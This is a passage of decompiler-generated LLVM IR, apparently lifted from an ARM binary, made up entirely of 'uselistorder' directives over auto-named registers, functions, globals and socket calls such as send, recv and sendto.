  uselistorder i32 %v3_12368, { 1, 0 }
  uselistorder i1 %v7_12350, { 1, 0 }
  uselistorder i32 %v3_1234c, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_12340, { 1, 0 }
  uselistorder i32 %v1_12324, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_12310, { 2, 1, 0 }
  uselistorder i32 %v3_1230c, { 1, 0 }
  uselistorder i32 %v0_12310, { 1, 0 }
  uselistorder i32 %v1_122a4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_122a4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12280, { 2, 1, 0 }
  uselistorder i32 %v1_1227c, { 1, 0 }
  uselistorder i32 %v0_1224c, { 0, 2, 1 }
  uselistorder i32 %v1_12244, { 1, 0 }
  uselistorder i1 %v7_12210, { 0, 3, 1, 2 }
  uselistorder i1 %v2_12210, { 1, 2, 0 }
  uselistorder i32 %v2_12208, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_12200, { 1, 0 }
  uselistorder i32 %v1_121e4, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_121d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_121d8, { 0, 2, 1 }
  uselistorder i32 %v1_121c8, { 1, 0 }
  uselistorder i32 %v3_1222c, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge223, { 1, 0, 2 }
  uselistorder i32 %v3_12118, { 1, 0 }
  uselistorder i32 %v1_12104, { 1, 0 }
  uselistorder i32 %v1_120ec, { 1, 2, 0 }
  uselistorder i32 %v0_120f8, { 0, 3, 2, 1 }
  uselistorder i32 %v0_120bc, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_120b0, { 2, 1, 0 }
  uselistorder i32 %v1_1208c, { 3, 1, 0, 4, 2 }
  uselistorder i32 %v3_1206c, { 1, 2, 0, 3 }
  uselistorder i1 %v2_12064, { 1, 0 }
  uselistorder i32 %v2_11f80, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11f6c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_11e8c, { 1, 0 }
  uselistorder i32 %v1_11e88, { 1, 0 }
  uselistorder i32 %v4_11e64, { 1, 0 }
  uselistorder i32 %v5_11e4c, { 0, 2, 1 }
  uselistorder i1 %v2_11dd4, { 1, 0 }
  uselistorder i1 %v3_11db8, { 1, 0, 2 }
  uselistorder i1 %v2_11da4, { 1, 0 }
  uselistorder i1 %v2_11d80, { 1, 0 }
  uselistorder i32 %v1_11d30, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11d1c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11d18, { 4, 5, 6, 0, 7, 1, 2, 3, 8 }
  uselistorder i32 %v4_11d08, { 1, 0 }
  uselistorder i32 %v0_11cf8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11ce8, { 1, 0 }
  uselistorder i32 %stack_var_-1872.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_11f50, { 1, 0, 2 }
  uselistorder i32 %v2_12970, { 1, 0, 3, 4, 2 }
  uselistorder i32 %v2_128bc, { 1, 0, 5, 4, 3, 6, 7, 2 }
  uselistorder i32 %v2_12d48, { 1, 2, 0 }
  uselistorder i32 %v2_12550, { 0, 1, 3, 2 }
  uselistorder i32 %v2_12238, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %v2_11cbc, { 2, 3, 4, 0, 1, 7, 6, 5, 8 }
  uselistorder i32 %v2_11cb8, { 4, 3, 0, 1, 6, 5, 2, 7 }
  uselistorder i32 %v4_1187c, { 1, 0 }
  uselistorder i32 %v4_1181c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_11814, { 0, 1, 3, 2 }
  uselistorder i32 %v0_117bc, { 3, 2, 0, 1 }
  uselistorder i1 %v7_11760, { 1, 0 }
  uselistorder i32 %v3_11758, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_11740, { 0, 2, 1 }
  uselistorder i32 %v0_11728, { 2, 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge230, { 1, 0 }
  uselistorder i32 %v0_1169c, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-92, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-48, { 3, 4, 2, 5, 1, 6, 0, 7, 8 }
  uselistorder i32* %stack_var_-56, { 6, 7, 2, 8, 3, 9, 4, 10, 1, 11, 0, 5, 12, 13 }
  uselistorder i32* %stack_var_-38, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 66, 67, 44, 36, 68, 69, 70, 71, 72, 13, 14, 45, 46, 47, 48, 0, 1, 2, 3, 15, 63, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 57, 58, 59, 42, 43, 49, 50, 51, 52, 53, 54, 55, 56, 73, 74, 75, 76, 77, 78, 60, 61, 79, 80, 82, 81, 83, 84, 85, 86, 88, 90, 89, 87, 91, 92, 93, 94, 100, 95, 96, 97, 98, 102, 101, 65, 104, 103, 64, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 62, 123, 124, 125, 126, 127, 128, 130, 129, 132, 131, 99, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 48, 35, 31, 49, 36, 37, 38, 0, 1, 2, 42, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 32, 34, 33, 43, 45, 44, 39, 40, 41, 50, 51, 52, 53, 54, 55, 56, 46, 68, 57, 58, 59, 60, 61, 63, 65, 64, 47, 62, 66, 67, 69, 70, 74, 71, 72, 73, 75, 78, 76, 79, 77, 80, 81, 82, 83, 84, 85, 86, 87, 90, 91, 92, 93, 94, 95, 88, 89, 96, 97, 98, 99, 100, 101, 102, 103, 105, 104, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 47, 48, 49, 38, 39, 35, 14, 15, 40, 41, 1, 2, 3, 42, 62, 63, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 43, 44, 0, 50, 51, 52, 45, 46, 53, 54, 55, 57, 58, 56, 59, 60, 64, 61, 152, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 150, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151 }
  uselistorder i32* %r0.global-to-local, { 12, 14, 13, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 28, 27, 30, 29, 1, 31, 128, 127, 33, 130, 129, 106, 109, 108, 98, 97, 131, 133, 132, 32, 35, 34, 36, 111, 110, 112, 3, 2, 4, 6, 5, 8, 7, 9, 10, 11, 116, 115, 38, 37, 39, 41, 40, 42, 43, 45, 44, 46, 48, 47, 49, 51, 50, 52, 53, 54, 55, 56, 57, 59, 58, 61, 60, 63, 62, 64, 65, 66, 67, 69, 68, 71, 70, 73, 72, 74, 75, 76, 77, 79, 78, 81, 80, 83, 82, 84, 85, 86, 87, 89, 88, 91, 90, 93, 92, 94, 95, 96, 100, 99, 107, 101, 102, 103, 118, 117, 120, 119, 104, 105, 114, 113, 137, 134, 135, 122, 121, 123, 124, 136, 138, 139, 140, 142, 141, 143, 149, 144, 145, 148, 146, 147, 151, 152, 150, 233, 153, 154, 155, 156, 158, 157, 125, 159, 160, 161, 0, 162, 163, 165, 164, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 234, 236, 235, 237, 241, 240, 238, 239, 242, 243, 126, 244 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ip.global-to-local, { 23, 24, 2, 25, 3, 16, 0, 1, 20, 4, 5, 7, 6, 9, 8, 11, 10, 12, 13, 14, 19, 15, 21, 17, 18, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 22, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 55, 109, 110, 111, 112, 113, 10, 11, 72, 73, 74, 75, 76, 0, 1, 6, 7, 2, 3, 4, 5, 8, 91, 12, 13, 14, 99, 15, 16, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 56, 57, 61, 62, 58, 59, 60, 63, 93, 64, 69, 70, 65, 66, 67, 68, 71, 92, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 100, 114, 115, 116, 117, 118, 119, 108, 101, 94, 95, 120, 122, 121, 123, 124, 126, 128, 127, 102, 125, 129, 130, 131, 132, 133, 134, 139, 135, 136, 137, 138, 105, 106, 103, 104, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 158, 157, 156, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 98, 175, 176, 177, 178, 179, 97, 180, 181, 182, 96, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 107, 196 }
  uselistorder i1* %cpsr_c.global-to-local, { 9, 10, 11, 57, 108, 109, 110, 111, 112, 12, 74, 75, 76, 77, 0, 1, 6, 7, 2, 3, 4, 5, 8, 90, 13, 14, 15, 98, 16, 17, 18, 19, 20, 21, 22, 27, 28, 23, 24, 25, 26, 29, 30, 31, 36, 37, 32, 33, 34, 35, 38, 39, 40, 45, 46, 41, 42, 43, 44, 47, 48, 49, 54, 55, 50, 51, 52, 53, 56, 58, 59, 63, 64, 60, 61, 62, 65, 92, 66, 71, 72, 67, 68, 69, 70, 73, 91, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 99, 113, 114, 115, 116, 117, 118, 107, 100, 93, 94, 119, 121, 120, 122, 124, 126, 125, 101, 123, 127, 128, 129, 130, 131, 136, 132, 133, 134, 135, 104, 105, 102, 137, 103, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 97, 168, 169, 170, 171, 172, 96, 173, 174, 175, 95, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 106, 193 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder i8 31, { 7, 1, 2, 0, 3, 4, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @_memcpy, { 4, 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @_memmove, { 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_13070, { 35, 34, 36, 33, 32, 31, 30, 29, 28, 27, 37, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_13044, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 32, 33, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 (i32)* @function_13128, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 16, 15, 18, 17, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_143a8.89 to i32), { 4, 23, 2, 24, 3, 25, 1, 26, 0, 27, 10, 28, 9, 29, 19, 30, 8, 31, 22, 32, 20, 33, 21, 34, 5, 35, 6, 36, 7, 37, 11, 38, 12, 39, 13, 40, 14, 41, 15, 42, 16, 43, 17, 44, 18, 45 }
  uselistorder i8 58, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 62, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 37, { 5, 3, 4, 2, 1, 0 }
  uselistorder i8 34, { 6, 4, 5, 3, 2, 1, 0, 7, 8, 9, 10 }
  uselistorder i8 36, { 11, 12, 7, 8, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 12, 13, 8, 9, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @_send, { 28, 27, 26, 25, 24, 23, 22, 11, 30, 29, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 9, 8, 10, 3, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @_recv, { 4, 9, 8, 7, 6, 5, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_13b18, { 22, 24, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* bitcast (i8** @global_var_1cdec.246 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1cded.247, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32*)* @getsockopt, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @_select, { 1, 2, 3, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 1544, { 1, 0 }
  uselistorder i32* @sp, { 4, 0, 5, 1, 6, 2, 7, 3 }
  uselistorder i32 1672, { 2, 0, 1 }
  uselistorder void (i32)* @exit, { 2, 1, 4, 0, 3, 6, 5, 7 }
  uselistorder i32 ()* @function_1141c, { 3, 2, 1, 0 }
  uselistorder i32 254, { 8, 9, 10, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i8 2, { 0, 2, 3, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 38, { 3, 4, 5, 6, 7, 0, 8, 1, 9, 2, 10 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @_recvfrom, { 0, 2, 1 }
  uselistorder i32 (i32, i32*, i32, i32, %sockaddr*, i32)* @sendto, { 4, 0, 1, 5, 2, 8, 7, 6, 3, 9 }
  uselistorder i32 16384, { 32, 52, 33, 53, 34, 54, 35, 55, 36, 56, 37, 57, 13, 58, 12, 69, 11, 50, 0, 51, 1, 59, 2, 60, 3, 61, 4, 62, 5, 63, 6, 64, 7, 65, 8, 66, 30, 67, 31, 68, 28, 71, 29, 72, 27, 70, 38, 91, 9, 92, 10, 93, 14, 80, 39, 81, 16, 73, 42, 74, 41, 75, 43, 76, 44, 77, 15, 78, 40, 79, 17, 82, 18, 83, 19, 84, 45, 46, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 48, 94, 49, 95, 26, 96, 47, 97 }
  uselistorder i32 (i32, i32, i32, i32)* @function_f1f8, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_f19c, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i8* @global_var_1cdd0.371, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.79 to i32), { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 0, 16 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 28, { 2, 3, 4, 5, 6, 7, 8, 0, 1, 17, 16, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20 }
  uselistorder i32 20, { 18, 12, 19, 13, 20, 14, 21, 82, 1, 83, 2, 84, 17, 22, 23, 3, 24, 25, 26, 27, 28, 29, 30, 4, 31, 32, 33, 34, 35, 36, 37, 38, 39, 5, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 6, 50, 51, 52, 53, 54, 55, 56, 57, 7, 58, 59, 60, 0, 61, 62, 63, 64, 15, 65, 66, 67, 68, 69, 70, 71, 72, 9, 73, 8, 74, 75, 76, 77, 11, 78, 10, 79, 80, 81, 85, 86, 87, 88, 89, 90, 91, 92, 93, 16, 94 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 31, { 9, 8, 18, 10, 3, 11, 15, 12, 16, 13, 17, 14, 7, 4, 0, 5, 1, 2, 6 }
  uselistorder i32 30, { 0, 8, 4, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32 14, { 7, 1, 2, 3, 4, 5, 8, 9, 6, 10, 11, 12, 13, 0, 14 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 56, { 3, 2, 0, 1 }
  uselistorder i32 127, { 5, 0, 6, 3, 7, 1, 8, 2, 9, 4, 10 }
  uselistorder i32 126, { 11, 5, 0, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_145ec.357 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_145e4.355 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_14554.321 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_14544.317 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_145b0.307 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14504.303 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_144fc.301 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_144f0.299 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_144e8.297 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_144e0.295 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_144c8.289 to i32), { 2, 5, 0, 6, 1, 7, 3, 8, 4, 9 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_14494.277 to i32), { 2, 24, 0, 25, 1, 26, 3, 27, 4, 28, 5, 29, 6, 30, 7, 31, 8, 32, 9, 33, 10, 34, 11, 35, 12, 36, 13, 37, 14, 38, 15, 39, 16, 40, 17, 41, 18, 42, 19, 20, 21, 43, 22, 44, 23, 45 }
  uselistorder i32 (i32, i32, i32)* @function_114f0, { 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_143d0.275 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1464c.273 to i32), { 2, 28, 3, 29, 4, 30, 5, 31, 6, 32, 0, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38, 12, 39, 13, 40, 14, 41, 15, 42, 16, 43, 17, 18, 19, 44, 20, 45, 21, 46, 22, 47, 23, 48, 1, 49, 24, 50, 25, 51, 26, 52, 27, 53 }
  uselistorder i8* @global_var_1cde1.269, { 1, 0 }
  uselistorder i32 80, { 3, 1, 2, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1cdd4.260 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8 64, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i8* @global_var_1cde0.261, { 1, 0 }
  uselistorder i32 40, { 1, 19, 20, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 21, 4, 22, 2, 23, 5, 24 }
  uselistorder i32 ptrtoint (i32* @global_var_1cdc0.256 to i32), { 0, 2, 1, 4, 5, 3, 6, 7, 8, 9 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1023, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 65280, { 30, 1, 2, 19, 0, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 11, 12, 22, 13, 14, 23, 15, 24, 25, 26, 16, 27, 28, 29, 17, 31, 18 }
  uselistorder i32 ()* @function_10bd8, { 69, 7, 6, 5, 4, 3, 2, 65, 68, 67, 66, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 0 }
  uselistorder i32 ()* @_setsockopt, { 1, 10, 2, 9, 8, 7, 3, 6, 5, 4, 0, 11 }
  uselistorder i32 2048, { 12, 5, 8, 9, 0, 1, 2, 3, 7, 6, 10, 4, 11, 13 }
  uselistorder i32 (i32, i32, ...)* @fcntl, { 10, 9, 6, 11, 3, 2, 1, 0, 5, 4, 8, 7, 13, 12, 14 }
  uselistorder i32* @global_var_1ce14.254, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_1ce10.252, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @_calloc, { 1, 35, 2, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 6, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5, 4, 3, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1cdf0.240, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @time, { 9, 7, 6, 0, 1, 3, 2, 8, 5, 4, 10 }
  uselistorder i32* @global_var_1cdf4.141, { 3, 4, 2, 0, 5, 1, 6, 13, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ()* @function_13d0c, { 0, 2, 1 }
  uselistorder i32 ()* @fork, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder i32* @fp, { 2, 3, 4, 5, 6, 42, 43, 35, 36, 37, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 32, 33, 34, 38, 1, 39, 40, 41 }
  uselistorder i32* @sl, { 1, 2, 3, 4, 5, 6, 73, 74, 57, 58, 59, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 0, 97, 98, 99, 100 }
  uselistorder i32* @sb, { 2, 3, 6, 0, 1, 4, 5, 49, 48, 7, 8, 50, 51, 39, 40, 41, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i32* @r8, { 7, 8, 10, 9, 11, 12, 13, 88, 89, 90, 91, 77, 78, 79, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 6, 48, 49, 50, 51, 52, 53, 54, 55, 5, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 81, 82, 83, 84, 85, 86, 87, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 131, 128, 129, 130, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 157, 155, 158, 159, 160, 161, 162, 163, 164 }
  uselistorder i32* @r7, { 135, 136, 5, 13, 6, 1, 4, 20, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 21, 22, 137, 138, 139, 120, 121, 122, 23, 0, 24, 25, 26, 27, 28, 29, 30, 2, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 3, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182 }
